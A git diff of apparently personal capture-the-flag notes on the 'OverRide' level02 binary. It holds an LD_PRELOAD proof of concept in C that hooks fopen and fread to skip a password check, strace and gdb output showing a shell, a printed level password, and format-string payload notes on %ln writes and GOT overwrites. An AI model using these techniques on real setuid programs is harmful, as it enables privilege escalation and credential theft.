@@ -26,8 +26,8 @@ String dump of section '.rodata':
   [    a8]  /***************************************\
   [    d8]  | You must login to access this system. |
   [   108]  \**************************************/
-  [   131]  --[ Username: 
-  [   140]  --[ Password: 
+  [   131]  --[ Username:
+  [   140]  --[ Password:
   [   150]  *****************************************
   [   17a]  Greetings, %s!^J
   [   18a]  /bin/sh
@@ -254,8 +254,8 @@ Dump of assembler code for function main:
    0x0000000000400a85 <+625>:	mov    edi,0x400d32
    0x0000000000400a8a <+630>:	call   0x4006b0 <system@plt>
    0x0000000000400a8f <+635>:	mov    eax,0x0
-   0x0000000000400a94 <+640>:	leave  
-   0x0000000000400a95 <+641>:	ret    
+   0x0000000000400a94 <+640>:	leave
+   0x0000000000400a95 <+641>:	ret
    0x0000000000400a96 <+642>:	lea    rax,[rbp-0x70]
    0x0000000000400a9a <+646>:	mov    rdi,rax
    0x0000000000400a9d <+649>:	mov    eax,0x0
@@ -268,10 +268,266 @@ End of assembler dump.
 #+end_src
 ** Source
 [[source]]
-[[source]]
-** Exploitation Idea
+** Exploitation Ideas
+*** Not working ones
+**** CANC Use buffer overflow to modify the content of the passwd.
+CLOSED: [2025-11-26 Wed 16:08]
 #+begin_src shell
-Use buffer overflow to modify the content of the passwd.
+  passwd_begin = 0x7fffffffea60
+  username= 0x7fffffffe9f0
+  passwd_input = 0x7fffffffea90
+  username > passwd_begin?
+  p 0x7fffffffea90 > 0x7fffffffea60
+  username > passwd_begin = 1
+  passwd_input > passwd_begin?
+  p 0x7fffffffe9f0 > 0x7fffffffea60
+  passwd_input > passwd_begin = 0
+  p/d 0x7fffffffea60 - 0x7fffffffe9f0
+#+end_src
+
+**** CANC May i need to change file size?
+CLOSED: [2025-11-26 Wed 16:08]
+don't use it for strncmp is Hardcoded.
+**** CANC May modify the string on the elffile to point to one i craft/know the content.
+CLOSED: [2025-11-26 Wed 16:08]
+I don't got perms.
+**** May i create a dynamic lib
+#+begin_src shell
+!strace ./$USER
+execve("./level02", ["./level02"], [/* 20 vars */]) = 0
+brk(0)                                  = 0x602000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff8000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+#+end_src
+#+begin_quote
+https://book.jorianwoltjer.com/linux/linux-privilege-escalation/command-exploitation
+https://stackoverflow.com/questions/10448254/how-to-use-gdb-with-ld-preload
+#+end_quote
+~/etc/ld.so.preload or /etc/ld.so/nohwcap~
+for overwrite fread for always write in passwd[0] = '\n' and return 41 also if i want to check in debuging also i need to implement the open for return something not *0x0*
+
+#+begin_src shell
+   ! LD_PRELOAD=/tmp strace ./$USER
+  ERROR: ld.so: object '/tmp' from LD_PRELOAD cannot be preloaded: ignored.
+  execve("./level02", ["./level02"], [/* 21 vars */]) = 0
+  brk(0)                                  = 0x602000
+  access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+  mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff8000
+  open("/tmp", O_RDONLY|O_CLOEXEC)        = 7
+  read(7, 0x7fffffffe468, 832)            = -1 EISDIR (Is a directory)
+   ! LD_LIBRARY_PATH=/tmp strace ./$USER
+  execve("./level02", ["./level02"], [/* 21 vars */]) = 0
+  brk(0)                                  = 0x602000
+  access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+  mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff8000
+  access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+  open("/tmp/tls/x86_64/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+
+#+end_src
+#+begin_quote
+  there is two ways
+  modify LD_LIBRARY_PATH and hijack one of libraries and ln the rest
+  append LD_PRELOAD= with the overwrite of fwrite, fopen.
+  In this case fclose don't crash if receive and invalid param. but maybe in future scenarios others call could crash  and should be patched in the library.
+#+end_quote
+***** Proof of concept
+Must unsetenv because could make trouble on others syscalls for example execve.
+#+begin_src c
+  #include <stdlib.h>
+  #include <unistd.h>
+
+  void *fopen(const char *str, const char *mode)
+  {
+    write(1, "ld_preload\n", 11);
+    unsetenv("LD_PRELOAD");
+    return ((void*)0x1);
+  }
+
+  unsigned long int fread(void *ptr, size_t size, size_t n, void *stream)
+  {
+    write(1, "ld_preload\n", 11);
+    ,*(char *)ptr='\n';
+    return (41);
+  }
+//Added after see the crash for not overload.
+  int fclose(void *stream)
+    {
+      return (0);
+    }
+
+#+end_src
+
+#+begin_src shell
+ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
+#+end_src
+**** Verify works?.
+#+begin_src shell
+  LD_PRELOAD=/tmp/preload.so ./$USER
+  ===== [ Secure Access System v1.0 ] =====
+  /***************************************\
+  | You must login to access this system. |
+  \**************************************/
+  --[ Username: a
+  --[ Password: a
+  ,*****************************************
+  a does not have access!
+#+end_src
+#+begin_quote
+Look like isn't working fine in this scenarios
+#+end_quote
+#+begin_src shell
+  level02@OverRide:~$ LD_PRELOAD=/tmp/preload.so strace ./$USER
+  execve("./level02", ["./level02"], [/* 20 vars */]) = 0
+  brk(0)                                  = 0x602000
+  access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+  mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff8000
+  open("/tmp/preload.so", O_RDONLY|O_CLOEXEC) = 3
+  read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\340\3\0\0\0\0\0\0"..., 832) = 832
+  fstat(3, {st_mode=S_IFREG|0775, st_size=6295, ...}) = 0
+  mmap(NULL, 2101264, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff7bd8000
+  mprotect(0x7ffff7bd9000, 2093056, PROT_NONE) = 0
+  mmap(0x7ffff7dd8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0x7ffff7dd8000
+  close(3)                                = 0
+  access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+  open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+  fstat(3, {st_mode=S_IFREG|0644, st_size=23291, ...}) = 0
+  mmap(NULL, 23291, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffff7ff2000
+  close(3)                                = 0
+  access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+  open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+  read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\31\2\0\0\0\0\0"..., 832) = 832
+  fstat(3, {st_mode=S_IFREG|0755, st_size=1807032, ...}) = 0
+  mmap(NULL, 3921080, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff781a000
+  mprotect(0x7ffff79ce000, 2093056, PROT_NONE) = 0
+  mmap(0x7ffff7bcd000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b3000) = 0x7ffff7bcd000
+  mmap(0x7ffff7bd3000, 17592, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7bd3000
+  close(3)                                = 0
+  mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff1000
+  mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff0000
+  mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fef000
+  arch_prctl(ARCH_SET_FS, 0x7ffff7ff0700) = 0
+  mprotect(0x7ffff7bcd000, 16384, PROT_READ) = 0
+  mprotect(0x7ffff7dd8000, 4096, PROT_READ) = 0
+  mprotect(0x7ffff7ffc000, 4096, PROT_READ) = 0
+  munmap(0x7ffff7ff2000, 23291)           = 0
+  write(1, "ld_preload\n", 11ld_preload
+  )            = 11
+  write(1, "ld_preload\n", 11ld_preload
+  --- SIGSEGV (Segmentation fault) @ 0 (0) ---
+  )            = 11
+  +++ killed by SIGSEGV (core dumped) +++
+  Segmentation fault (core dumped)
+
+#+end_src
+
+#+begin_quote
+Weird why crash
+
+Secure-execution mode
+
+For security reasons, if the dynamic linker determines that a binary should be run in secure-execution mode, the effects of some environment variables are voided or modified, and furthermore those environment variables are stripped from the environment, so that the program does not even see the definitions. Some of these environment variables affect the operation of the dynamic linker itself, and are described below. Other environment variables treated in this way include: GCONV_PATH, GETCONF_DIR, HOSTALIASES, LOCALDOMAIN, LD_AUDIT, LD_DEBUG, LD_DEBUG_OUTPUT, LD_DYNAMIC_WEAK, LD_HWCAP_MASK, LD_LIBRARY_PATH, LD_ORIGIN_PATH, LD_PRELOAD, LD_PROFILE, LD_SHOW_AUXV, LOCALDOMAIN, LOCPATH, MALLOC_TRACE, NIS_PATH, NLSPATH, RESOLV_HOST_CONF, RES_OPTIONS, TMPDIR, and TZDIR.
+
+A binary is executed in secure-execution mode if the AT_SECURE entry in the auxiliary vector (see getauxval(3)) has a nonzero value. This entry may have a nonzero value for various reasons, including:
+
+•
+    The process's real and effective user IDs differ, or the real and effective group IDs differ. This typically occurs as a result of executing a set-user-ID or set-group-ID program.
+•
+    A process with a non-root user ID executed a binary that conferred capabilities to the process.
+•
+    A nonzero value may have been set by a Linux Security Module.
+#sources: https://unix.stackexchange.com/questions/757484/ld-preload-does-not-work-and-ld-debug-shows-nothing
+https://manpages.debian.org/trixie/manpages/ld.so.8.en.html#Secure-execution_mode
+#+end_quote
+
+#+begin_src shell
+    gdb -q ./$USER
+    r
+   Program received signal SIGSEGV, Segmentation fault.
+  0x00007ffff7887554 in fclose () from /lib/x86_64-linux-gnu/libc.so.6
+  # Once fix that on strace.
+  write(1, "Greetings, a!\n", 14Greetings, a!
+)         = 14
+rt_sigaction(SIGINT, {SIG_IGN, [], SA_RESTORER, 0x7ffff78500b0}, {SIG_DFL, [], 0}, 8) = 0
+rt_sigaction(SIGQUIT, {SIG_IGN, [], SA_RESTORER, 0x7ffff78500b0}, {SIG_DFL, [], 0}, 8) = 0
+rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0x7fffffffe9b0) = 1710
+wait4(1710, $ i am in
+/bin/sh: 1: i: not found
+$ id
+uid=1002(level02) gid=1002(level02) groups=1002(level02),100(users)
+$ whoami
+level02
+$ cat /home/users/`whoami`/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+$
+[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 1710
+rt_sigaction(SIGINT, {SIG_DFL, [], SA_RESTORER, 0x7ffff78500b0}, NULL, 8) = 0
+rt_sigaction(SIGQUIT, {SIG_DFL, [], SA_RESTORER, 0x7ffff78500b0}, NULL, 8) = 0
+rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+--- SIGCHLD (Child exited) @ 0 (0) ---
+exit_group(0)                           = ?
+#+end_src
+
+  may i need to hook all libc call
+#+begin_src shell
+  ldd ./$USER
+  	linux-vdso.so.1 =>  (0x00007ffff7ffd000)
+  	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c37000)
+  	/lib64/ld-linux-x86-64.so.2 (0x0000555555554000)
+  ls -lhtrd /lib/x86_64-linux-gnu/libc.so.6
+    lrwxrwxrwx 1 root root 12 May 26  2016 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.15.so
+  ln -fs /tmp/preload.so /lib/x86_64-linux-gnu/libc-2.15.so
+  ln: cannot remove `/lib/x86_64-linux-gnu/libc-2.15.so': Permission denied
+ls -lhtrd /lib64/ld-linux-x86-64.so.2
+lrwxrwxrwx 1 root root 32 May 26  2016 /lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.15.so
+#+end_src
+*** String format.
+#+begin_quote
+in source printf (username)
+that we write previously with max 99B + '\0' Byte;
+because we fail the password
+we can get .pass of many ways:
+change exit got to point system call va or after if strncmp.
+change stack to point password and print with %s
+change return printf in stack to point to system call va
+remember we're on x64 pointer double size
+if we use %ln we can write the pointer as long int (x64) = 8B but because is in stack maybe is a huge number and be worthit split the value in int or short int.
+gdb way to check that
+gdb --batch -ex "p/x (int[2])0x7fffffffe9f0"
+$1 = {0xffffe9f0, 0x7fff}
+level02@OverRide:~$ gdb --batch -ex "p/x (short[4])0x7fffffffe9f0"
+$1 = {0xe9f0, 0xffff, 0x7fff, 0x0}
+
+https://www.it.uc3m.es/pbasanta/asng/course_notes/input_output_printf_en.html
+hh     A following integer conversion corresponds to a signed char
+          or unsigned char argument, or a following n conversion
+          corresponds to a pointer to a signed char argument.
+
+h      A following integer conversion corresponds to a short or
+         unsigned short argument, or a following n conversion
+         corresponds to a pointer to a short argument.
+
+l      (ell) A following integer conversion corresponds to a long
+        or unsigned long argument, or a following n conversion
+        corresponds to a pointer to a long argument, or a following
+        c conversion corresponds to a wint_t argument, or a
+        following s conversion corresponds to a pointer to wchar_t
+        argument.  On a following a, A, e, E, f, F, g, or G
+        conversion, this length modifier is ignored (C99; not in SUSv2).
+https://man7.org/linux/man-pages/man3/printf.3.html
+#+end_quote
+
+#+begin_src shell
+    string format test
+
+    AAAAAAAA%p%p%p%p%p%p%p%p
+
+  username_va=0x7fffffffe9f0
+  change AAAAAAAA with the username va
+
+
+
 #+end_src
 * Exploit
 #+begin_src shell
